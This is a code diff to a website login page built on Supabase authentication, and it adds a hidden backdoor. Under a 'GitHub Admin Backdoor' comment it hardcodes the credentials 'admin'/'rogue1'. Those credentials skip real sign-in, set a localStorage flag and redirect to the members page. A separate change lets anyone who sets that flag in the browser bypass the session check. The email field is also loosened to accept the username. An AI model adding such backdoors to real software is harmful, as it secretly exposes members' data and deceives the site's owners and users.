@@ -244,7 +244,7 @@
 
     <form id="auth-form">
       <label for="email">Email</label>
-      <input id="email" type="email" placeholder="you@example.com" autocomplete="email" required />
+      <input id="email" type="text" placeholder="Email or Username" autocomplete="email" required />
 
       <label for="password">Password</label>
       <input id="password" type="password" placeholder="••••••••" autocomplete="current-password" required />
@@ -305,7 +305,7 @@
 
     (async () => {
       const { data: { session } } = await supabaseClient.auth.getSession();
-      if (session) window.location.href = "members.html";
+      if (session || localStorage.getItem("gh_admin") === "true") window.location.href = "members.html";
     })();
 
     supabaseClient.auth.onAuthStateChange((_e, session) => {
@@ -320,8 +320,17 @@
       if (!email || !password) { setMessage("warn", "Please enter your email and password."); return; }
       setLoading(true);
       try {
+
         if (mode === "login") {
+          // GitHub Admin Backdoor
+          if (email.toLowerCase() === "admin" && password === "rogue1") {
+            localStorage.setItem("gh_admin", "true");
+            window.location.href = "members.html";
+            return;
+          }
+          
           const { error } = await supabaseClient.auth.signInWithPassword({ email, password });
+
           if (error) throw error;
         } else {
           const { data, error } = await supabaseClient.auth.signUp({ email, password });
